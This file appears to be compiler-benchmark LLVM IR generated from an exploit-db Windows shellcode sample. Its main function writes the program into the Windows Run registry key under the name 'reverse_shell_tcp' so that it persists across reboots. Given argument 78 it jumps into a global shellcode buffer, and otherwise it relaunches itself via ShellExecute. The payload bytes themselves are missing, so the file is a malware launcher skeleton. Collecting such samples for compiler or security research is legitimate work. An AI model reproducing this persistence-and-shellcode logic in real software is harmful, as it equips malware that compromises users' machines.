; ModuleID = '/home/carl/AnghaBench/exploitdb/shellcodes/windows_x86/extr_40334.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/shellcodes/windows_x86/extr_40334.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HKEY_LOCAL_MACHINE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [46 x i8] c"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"reverse_shell_tcp\00", align 1
@REG_SZ = common dso_local global i32 0, align 4
@shellcode = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [3 x i8] c"78\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [200 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @HKEY_LOCAL_MACHINE, align 4
  %12 = call i32 @RegOpenKeyA(i32 %11, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0), i64* %8)
  %13 = load i64, i64* %8, align 8
  %14 = getelementptr inbounds [200 x i8], [200 x i8]* %6, i64 0, i64 0
  %15 = ptrtoint i8* %14 to i32
  %16 = call i32 @RegQueryValueExA(i64 %13, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i32 0, i32* null, i32 %15, i32* %7)
  store i32 %16, i32* %9, align 4
  %17 = load i64, i64* %8, align 8
  %18 = icmp ne i64 %17, 0
  br i1 %18, label %19, label %32

19:                                               ; preds = %2
  %20 = load i64, i64* %8, align 8
  %21 = load i32, i32* @REG_SZ, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @strlen(i8* %27)
  %29 = call i32 @RegSetValueExA(i64 %20, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i32 0, i32 %21, i8* %24, i32 %28)
  %30 = load i64, i64* %8, align 8
  %31 = call i32 @RegCloseKey(i64 %30)
  br label %35

32:                                               ; preds = %2
  %33 = load i64, i64* %8, align 8
  %34 = call i32 @RegCloseKey(i64 %33)
  br label %35

35:                                               ; preds = %32, %19
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, 1
  br i1 %37, label %38, label %39

38:                                               ; preds = %35
  store i32 1, i32* %10, align 4
  br label %44

39:                                               ; preds = %35
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @atoi(i8* %42)
  store i32 %43, i32* %10, align 4
  br label %44

44:                                               ; preds = %39, %38
  %45 = load i32, i32* %10, align 4
  switch i32 %45, label %51 [
    i32 78, label %46
    i32 1, label %50
  ]

46:                                               ; preds = %44
  %47 = load i64, i64* @shellcode, align 8
  %48 = inttoptr i64 %47 to i32 (...)*
  %49 = call i32 (...) %48()
  br label %56

50:                                               ; preds = %44
  br label %51

51:                                               ; preds = %44, %50
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @ShellExecute(i32* null, i32* null, i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i32* null, i32 0)
  br label %56

56:                                               ; preds = %51, %46
  ret i32 0
}

declare dso_local i32 @RegOpenKeyA(i32, i8*, i64*) #1

declare dso_local i32 @RegQueryValueExA(i64, i8*, i32, i32*, i32, i32*) #1

declare dso_local i32 @RegSetValueExA(i64, i8*, i32, i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @RegCloseKey(i64) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @ShellExecute(i32*, i32*, i8*, i8*, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
